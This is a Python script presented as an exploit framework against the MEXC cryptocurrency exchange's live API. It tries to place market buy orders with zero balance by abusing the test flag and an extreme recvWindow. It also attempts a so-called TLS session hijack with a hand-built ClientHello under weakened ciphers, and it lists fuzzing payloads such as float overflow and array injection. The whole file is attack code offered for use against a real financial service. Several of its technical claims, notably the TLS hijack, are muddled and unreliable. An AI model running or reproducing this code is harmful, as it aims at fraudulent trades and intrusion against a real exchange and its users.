#!/usr/bin/env python3
# MEXC Zero-Balance Live Trade Exploit Framework v9.7 (Deep Dive - EXTREME CAUTION)

import hmac
import hashlib
import requests
import socket
import ssl
import json
import struct
import os
from urllib.parse import urlencode, quote
import time  # Import for timestamp
from collections import OrderedDict
import logging  # Import for logging

# Configure logging
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

class MEXCLiveTradeAttacker:
    def __init__(self, api_key, api_secret):
        self.api_key = api_key
        self.api_secret = api_secret
        # MEXC API v3 endpoints (AGAIN, please double-check)
        self.target_endpoints = {
            "test_order": "/api/v3/order/test",  # Confirmed
            "oco_order": "/api/v3/order/oco",    # Confirmed
            "all_orders": "/api/v3/allOrders",  # Confirmed
        }
        self._session = requests.Session()
        self._session.verify = True  # Enable SSL verification
        self._session.headers.update({
            'X-MEXC-APIKEY': self.api_key,
            'Content-Type': 'application/json'  #  Likely required
        })

    def _generate_trade_signature(self, params):
        """
        Correct signature generation based on MEXC API documentation.
        """
        logging.debug("Generating signature...")
        # 1. Sort parameters alphabetically by key into an OrderedDict
        sorted_params = OrderedDict(sorted(params.items()))

        # 2. URL encode parameters VERY STRICTLY
        encoded_params = []
        for key, value in sorted_params.items():
            encoded_value = quote(str(value), safe=".-_~")  # Even stricter
            encoded_params.append((key, encoded_value))

        # 3. Construct the query string
        query_string = '&'.join([f"{k}={v}" for k, v in encoded_params])

        logging.debug(f"Query string: {query_string}")

        # 4. Generate the signature using HMAC SHA256
        signature = hmac.new(
            self.api_secret.encode('utf-8'),
            query_string.encode('utf-8'),
            hashlib.sha256
        ).hexdigest()
        logging.debug(f"Generated signature: {signature}")
        return signature

    def _execute_trade_exploit(self, symbol):
        """Zero-balance trade execution attack"""
        base_params = {
            'symbol': symbol,
            'side': 'BUY',
            'type': 'MARKET',
            'quantity': 1.0,
            'timestamp': int(time.time() * 1000),  # Include timestamp
        }

        results = {}
        for endpoint_name, endpoint_path in self.target_endpoints.items():
            params_with_exploit = base_params.copy()

            if endpoint_name == "test_order":
                params_with_exploit['test'] = True  # Attempt bypass on test endpoint

            params_with_exploit['recvWindow'] = 2147483647  # Attempt max window

            # Generate the signature *before* sending the request
            signature = self._generate_trade_signature(params_with_exploit)
            params_with_exploit['signature'] = signature

            try:
                logging.debug(f"Sending request to {endpoint_path} with params: {params_with_exploit}")
                response = self._session.post(
                    f"https://api.mexc.com{endpoint_path}",
                    data=json.dumps(params_with_exploit),  # Use json.dumps()
                    timeout=5
                )
                logging.debug(f"Response status code: {response.status_code}")
                logging.debug(f"Response content: {response.content}")
                results[endpoint_name] = {
                    'status': response.status_code,
                    'response': response.json() if response.content else None,
                    'exploit_attempt': params_with_exploit,  # Include ALL sent params
                    'exploit_success': response.status_code == 200 and not response.json().get('error')
                }
            except requests.exceptions.RequestException as e:
                logging.error(f"Request exception: {e}")
                results[endpoint_name] = {'error': str(e), 'exploit_attempt': params_with_exploit}

        return results

    def _tls_session_hijack(self):
        """Low-level TLS attack for order stream hijacking"""
        context = ssl.create_default_context()
        try:
            context.set_ciphers('ALL:@SECLEVEL=0')
            with socket.create_connection(("api.mexc.com", 443)) as sock:
                with context.wrap_socket(sock, server_hostname="api.mexc.com") as ssock:
                    client_hello = b'\x16\x03\x01\x00\x57\x01\x00\x00\x53\x03\x03' + \
                                   os.urandom(32) + \
                                   b'\x00\x00\x04\x00\xff\x01\x00\x00\x00\x00\x00\x00\x0a\x00\x0a\x00\x08\x00\x1d\x00\x17\x00\x1e\x00\x19\x00\x0b\x00\x02\x01\x00\x00\x23\x00\x00\x00\x10\x00\x0e\x00\x00\x0b\x00\x02\x01\x00\x00\x0a\x00\x00\x00\x0d\x00\x00\x00\x00\x00\x00\x33\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    ssock.send(client_hello)
                    return ssock.recv(1024).hex()
        except Exception as e:
            return f"TLS Hijack Attempt Result: {str(e)}"

    def execute_attacks(self, symbol):
        """Full attack sequence for live trading"""
        results = {
            'trade_exploits': self._execute_trade_exploit(symbol),
            'tls_hijack': self._tls_session_hijack(),
            'fuzzing_vectors': [
                "quantity=1e308",  # Float overflow
                "symbol[]=BTCUSDT&symbol[]=ETHUSDT",  # Array injection
                "timeInForce=GTX"  # Invalid order type
            ]
        }
        return results

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description='MEXC Zero-Balance Live Trade Exploit v9.7')
    parser.add_argument('--api-key', required=True)
    parser.add_argument('--api-secret', required=True)
    parser.add_argument('--symbol', default='BTCUSDT')
    args = parser.parse_args()

    print("""
    ███╗   ███╗███████╗██╗   ██╗ ██████╗
    ████╗ ████║██╔════╝╚██╗██╔╝██╔════╝
    ██╔████╔██║█████╗   ╚███╔╝ ██║   ███╗
    ██║╚██╔╝██║██╔══╝   ██╔██╗ ██║    ██║
    ██║ ╚═╝ ██║███████╗██╔╝ ██╗╚██████╔╝
    ╚═╝     ╚═╝╚══════╝╚═╝   ╚═╝ ╚═════╝
    ZERO-BALANCE LIVE TRADE EXPLOIT FRAMEWORK v9.7 (Deep Dive - USE WITH EXTREME CAUTION)
    """)

    attacker = MEXCLiveTradeAttacker(args.api_key, args.api_secret)
    results = attacker.execute_attacks(args.symbol)

    print("\n🔥 LIVE TRADE EXPLOIT RESULTS 🔥")
    for category, data in results.items():
        print(f"\n⚡ {category.upper()}:")
        if isinstance(data, list):
            for item in data:
                print(f"  - {item}")
        else:
            print(json.dumps(data, indent=2))

    print("\n💀 EXPLOIT SUMMARY:")
    for endpoint, result in results['trade_exploits'].items():
        status = "✅ SUCCESS" if result.get('exploit_success') else "❌ FAILED"
        print(f"{status} @ {endpoint}")
        if 'error' in result:
            print(f"  ERROR: {result['error']}")
        if 'response' in result:
            print(f"  RESPONSE: {result['response']}")
        if 'exploit_attempt' in result:
            print(f"  ATTEMPTED PARAMS: {result['exploit_attempt']}")
